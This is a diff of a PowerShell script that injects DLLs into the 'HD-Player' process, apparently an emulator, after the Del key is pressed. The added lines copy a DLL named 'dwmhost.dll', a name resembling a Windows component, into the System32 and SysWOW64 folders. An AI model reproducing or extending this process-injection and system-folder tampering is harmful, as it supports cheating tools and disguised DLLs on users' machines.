@@ -43,7 +43,22 @@ $dll2 = "cimgui.dll"
 $dll3 = "dwmhost.dll"
 $processName = "HD-Player"
 $system32Path = "$env:windir\System32"
-$destDll3Path = Join-Path -Path $system32Path -ChildPath $dll3
+$syswow64Path = "$env:windir\SysWOW64"
+
+# ---- [ Copy dwmhost.dll from System32 to SysWOW64 ] ----
+$sourceDll3Path = Join-Path -Path $system32Path -ChildPath $dll3
+$destDll3Path = Join-Path -Path $syswow64Path -ChildPath $dll3
+
+if (Test-Path $sourceDll3Path) {
+    try {
+        Copy-Item -Path $sourceDll3Path -Destination $destDll3Path -Force
+        Write-Output "Copied $dll3 from System32 to SysWOW64 successfully."
+    } catch {
+        Write-Error "Failed to copy $dll3 to SysWOW64: $_"
+    }
+} else {
+    Write-Error "Source $dll3 not found in System32."
+}
 
 $injectorCode = @"
 using System;
@@ -144,7 +159,6 @@ while ($true) {
         }
 
         Write-Output "[Del] pressed. Proceeding with DLL injection..."
-
 
         $dll1Path = Join-Path $dllFolder $dll1
         $dll2Path = Join-Path $dllFolder $dll2
